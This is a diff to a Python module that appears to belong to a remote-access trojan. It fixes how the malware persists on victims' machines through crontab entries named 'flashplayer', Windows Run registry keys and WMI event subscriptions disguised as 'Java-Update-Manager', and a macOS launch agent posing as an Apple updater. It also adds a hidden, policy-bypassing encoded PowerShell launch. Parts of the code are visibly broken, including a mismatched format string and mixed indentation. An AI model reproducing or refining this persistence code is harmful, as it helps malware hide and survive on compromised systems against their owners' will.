@@ -131,6 +131,7 @@ def _add_crontab_job(value=None, minutes=10, name='flashplayer'):
             value = sys.argv[0]
             if value and os.path.isfile(value):
                 if not _methods['crontab_job'].established:
+                    path = value
                     user = os.getenv('USERNAME', os.getenv('NAME'))
                     task = "0 */6 * * * {} {}".format(60/minutes, user, path)
                     with open('/etc/crontab', 'r') as fp:
@@ -225,16 +226,11 @@ def _add_registry_key(value=None, name='Java-Update-Manager'):
 def _add_powershell_wmi(command=None, name='Java-Update-Manager'):
     try:
         if os.name == 'nt' and not _methods['powershell_wmi'].established:
-            cmd_line  = ""
-            value = sys.argv[0]
-            if value and os.path.isfile(value):
-                cmd_line = 'start /b /min {}'.format(value)
-            elif command:
+            if command:
                 cmd_line = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(base64.b64encode(bytes(command).encode('UTF-16LE')))
-            if cmd_line:
                 startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
-		globals()['__Template_wmi'].replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
-                util.powershell(powershell)
+        		script = globals()['__Template_wmi'].replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
+                _ = util.powershell(script)
                 code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % name
                 result = util.powershell(code)
                 if name in result:
@@ -285,7 +281,7 @@ def _remove_crontab_job(value=None, name='flashplayer'):
 def _remove_launch_agent(value=None, name='com.apple.update.manager'):
     try:
         if _methods['launch_agent'].established:
-            launch_agent = persistence['launch_agent'].result
+            launch_agent = _methods['launch_agent'].result
             if os.path.isfile(launch_agent):
                 util.delete(launch_agent)
                 return (False, None)
@@ -315,7 +311,7 @@ def _remove_registry_key(value=None, name='Java-Update-Manager'):
         if _methods['registry_key'].established:
             value = _methods['registry_key'].result
             try:
-                key = OpenKey(_winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, _winreg.KEY_ALL_ACCESS)
+                key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, _winreg.KEY_ALL_ACCESS)
                 _winreg.DeleteValue(key, name)
                 _winreg.CloseKey(key)
                 return (False, None)
